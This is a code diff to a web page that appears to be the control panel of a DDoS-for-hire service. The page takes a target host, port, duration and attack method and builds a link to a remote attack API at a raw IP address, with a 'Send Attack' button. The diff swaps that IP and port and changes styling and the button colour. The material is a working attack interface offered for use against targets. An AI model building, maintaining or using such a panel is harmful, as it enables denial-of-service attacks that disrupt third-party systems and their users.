@@ -11,13 +11,12 @@
       padding: 20px;
     }
     .container {
-      background-image: url("https://files.catbox.moe/l239zh.jpg");
       max-width: 500px;
       margin: auto;
       background: white;
-      background-repeat: no-repeat;
-        background-size: cover;
-        width: 100%;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
     h1 {
       text-align: center;
@@ -83,11 +82,11 @@
         return;
       }
 
-      const baseUrl = 'http://174.138.26.59/:2033/api/Matzz';
+      const baseUrl = 'http://209.97.174.135/:6004/api/Matzz';
       const fullUrl = `${baseUrl}?key=Matzz&host=${encodeURIComponent(host)}&port=${port}&time=${time}&method=${encodeURIComponent(method)}`;
 
       document.getElementById('result').innerHTML = `
-        <a href="${fullUrl}" target="_blank" class="button" style="background-color: green; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; display: inline-block;">Send Attack</a>
+        <a href="${fullUrl}" target="_blank" class="button" style="background-color: red; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; display: inline-block;">Send Attack</a>
       `;
     }
   </script>
